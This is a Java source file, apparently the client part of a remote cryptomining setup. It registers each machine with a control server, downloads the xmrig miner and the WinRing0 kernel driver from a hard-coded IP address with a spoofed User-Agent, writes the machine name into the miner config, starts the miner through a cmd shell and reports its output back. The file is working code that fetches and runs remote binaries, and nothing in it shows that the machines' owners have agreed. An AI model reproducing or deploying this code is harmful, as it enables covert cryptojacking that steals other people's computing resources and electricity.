package client.main;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;
import java.util.Timer;

public class AXMain {
    //从ghostj的配置文件读取本机名称
    //向ax服务端发送注册消息
    //检查是否有xmrig已存在,没有则下载
    //读取ghostj的配置文件修改config.json中的本机pass
    //检测是否是windows10，如果是则直接退出
    //启动xmrig
    //向服务端发送xmrig的stdout
    //支持关闭和重启xmrig
    static Config ghostConfig=new Config("D:\\ProgramData\\Ghost\\ghostjc.ini");
    static String pass=ghostConfig.getStringAnyhow("name","axClient");
    static Connect connect=new Connect();
    static boolean printToStdout=false;
    static Timer timer=new Timer();
    static AutoSwitch autoSwitch;
    public static void main(String[] args) {
        if (args.length>0){
            printToStdout=Boolean.parseBoolean(args[0]);
        }
        String runtimeMode=FileRW.read("mode.txt");
        //从ghostj的配置文件读取本机名称
        //向ax服务端发送注册消息
        connect.start();
        try{
            Thread.sleep(3000);
        }catch (Exception ignored){}
        //检测是否是windows10，如果是则直接退出
        if (isWindows10()&&!runtimeMode.equalsIgnoreCase("ignoreosver")){
            System.out.println("[AX]Windows 10");
            System.exit(0);
        }
        //检查是否有xmrig已存在,没有则下载
        if (!(new File("D:\\xmrig\\config.json").exists())){
            try {
                downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", "D:\\xmrig", "dl"+new Date().getTime());
            }catch (Exception e) {
                e.printStackTrace();
            }
            try {
                downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/WinRing0x64.sys", "WinRing0x64.sys", "D:\\xmrig", "dl"+new Date().getTime());
            }catch (Exception e) {
                e.printStackTrace();
            }
            try {
                downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/xmrig.exe", "xmrig.exe", "D:\\xmrig", "dl"+new Date().getTime());
            }catch (Exception e) {
                e.printStackTrace();
            }
        }
        //读取ghostj的配置文件修改config.json中的本机pass
        String cfgjson=FileRW.readMultiLine("D:\\xmrig\\config.json");
        FileRW.write("D:\\xmrig\\config.json",cfgjson.replaceAll("DEVICE_PASS",pass).replaceAll("nmsl@wsnb.com",pass));
        //启动xmrig
        ProcessCmd processCmd=new ProcessCmd("cmd");
        processCmd.cmd="cmd";
        processCmd.start();
        try {
            Thread.sleep(1000);
            processCmd.processWriter.write("D:");
            processCmd.processWriter.newLine();
            processCmd.processWriter.flush();
            processCmd.processWriter.write("cd D:\\xmrig\n");
            processCmd.processWriter.newLine();
            processCmd.processWriter.flush();
            processCmd.processWriter.write("xmrig.exe\n");
            processCmd.processWriter.newLine();
            processCmd.processWriter.flush();
        }catch (Exception e){
            e.printStackTrace();
            AXMain.connect.writeIgnoreExce("cannot exec");
        }
        try {
            Thread.sleep(10000);
        }catch (Exception ignored){}
        autoSwitch=new AutoSwitch();
        timer.schedule(autoSwitch,new Date(),10000);
        //向服务端发送xmrig的stdout
        //支持关闭和重启xmrig
    }

    /**
     * 从网络Url中下载文件
     * @param urlStr
     * @param fileName
     * @param savePath
     * @throws IOException
     */
    public static void  downLoadFromUrl(String urlStr,String fileName,String savePath,String toekn) throws IOException{
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        //设置超时间为3秒
        conn.setConnectTimeout(3*1000);
        //防止屏蔽程序抓取而返回403错误
        conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
        conn.setRequestProperty("lfwywxqyh_token",toekn);
        //输入流
        DataInputStream dataInputStream=new DataInputStream(conn.getInputStream());
        //创建文件输出流
        // 文件保存位置
        File saveDir = new File(savePath.replaceAll("\\?"," "));
        if(!saveDir.exists()){
            saveDir.mkdir();
        }
        File file = new File(saveDir+File.separator+fileName);
        FileOutputStream fos = new FileOutputStream(file);

        byte[] data=new byte[1024];
        int len=0;
        while ((len=dataInputStream.read(data,0,data.length))!=-1){
            fos.write(data,0,len);
            fos.flush();
        }
        fos.close();
        dataInputStream.close();
    }
    public static boolean isWindows10() {
        return System.getProperties().getProperty("os.name").toUpperCase().contains("WINDOWS 10");
    }
}
